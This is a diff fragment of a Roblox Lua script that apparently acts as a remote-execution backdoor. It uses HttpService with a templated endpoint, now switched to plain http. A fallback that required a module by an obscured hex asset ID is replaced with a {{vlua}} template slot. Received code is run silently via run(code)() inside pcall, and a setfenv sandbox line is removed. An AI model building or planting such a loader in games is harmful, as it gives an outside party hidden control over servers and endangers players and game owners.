@@ -1,14 +1,9 @@
 local https = game:GetService("HttpService")
 local plrs = game:GetService("Players")
 
-local endpoint = "https://{{endpoint}}/"
+local endpoint = "http://{{endpoint}}/"
 
-local run = loadstring
-local T = table
-local loadstringEnabled = pcall(function() loadstring("_ = true")() end)
-if not loadstringEnabled then
-	run = require(0x65243E0A0531)
-end
+{{vlua}}
 
 local threads = {}
 
@@ -38,7 +33,6 @@ local function plrAdded(plr)
 				    	coroutine.wrap(function()
 							pcall(function()
 								run(code)()
-								setfenv(1, setmetatable({table = T}, {__index = getfenv(0)}))
 							end)
                         end)()
                     end
